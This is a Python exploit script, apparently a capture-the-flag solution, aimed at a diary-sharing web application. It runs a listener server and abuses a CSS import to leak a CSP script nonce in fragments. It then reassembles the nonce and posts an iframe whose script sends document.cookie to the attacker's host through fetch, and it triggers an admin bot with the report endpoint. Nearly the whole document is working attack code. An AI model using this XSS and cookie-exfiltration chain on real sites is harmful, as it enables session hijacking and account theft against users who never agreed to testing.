import _thread
import random
import re
import string
import time

import flask
import requests

lhost = "http://[player]:[lport]"
lport = 1314
url = "http://[problem]:[port]"
css = "https://unpkg.com/[expcss]"
username = "".join(random.choices(string.ascii_lowercase, k=8))
password = "114514"
nonce = ""

s = requests.Session()
app = flask.Flask(__name__)


def login():
    r = s.post(
        url + "/login",
        {
            "username": username,
            "password": password,
        },
    )
    print("login: {}".format("invalid" not in r.text.lower()))


def new_post(val):
    r = s.post(url + "/write", {"title": "1", "content": val})
    reg = re.findall(r'<a href="\/read#id=(\d+)"', r.text)
    r = s.get("{}/share_diary/{}".format(url, reg[-1]))
    return reg[-1]


@app.route("/")
def flag():
    print(flask.request.path)
    return "1"


@app.route("/i")
def iframe():
    exp = """
<script>
  let ref = window.open("http://localhost/share/read#id=1&username={}");
  setTimeout(() => {{
    ref.location = "http://localhost/share/read#id=2&username={}"
  }}, 10000)
</script>
""".format(
        username, username
    )
    return exp


def recover(pieces):
    nonce = ""
    suffixs = [p[1:] for p in pieces]
    for p in pieces:
        if p[:-1] not in suffixs:
            nonce += p
            break
    while len(nonce) < 32:
        for p in pieces:
            if p.startswith(nonce[-2:]):
                nonce += p[-1]
                break
    return nonce


pieces = []


@app.route("/x")
def iter():
    global pieces
    print(flask.request.args["a"])
    pieces.append(flask.request.args["a"])
    print(len(pieces))
    if len(pieces) == 30:
        nonce = recover(pieces)
        pieces = []
        print(nonce)
        new_post(
            f'<iframe srcdoc="<script nonce=\'{nonce}\'>fetch(\'{lhost}/\'+escape(document.cookie))</script>"></iframe>')
    return "1"


def web():
    app.run(host="0.0.0.0", port=lport)


if __name__ == "__main__":
    _thread.start_new_thread(web, ())
    time.sleep(1)
    print(username)
    login()
    new_post(
        '<meta http-equiv="refresh" content="1;url={}/i" >'.format(lhost))
    new_post(
        "<style>@import url({});</style>".format(css)
    )
    s.get(url + '/report?id=0&username=' + username)
    time.sleep(3600)
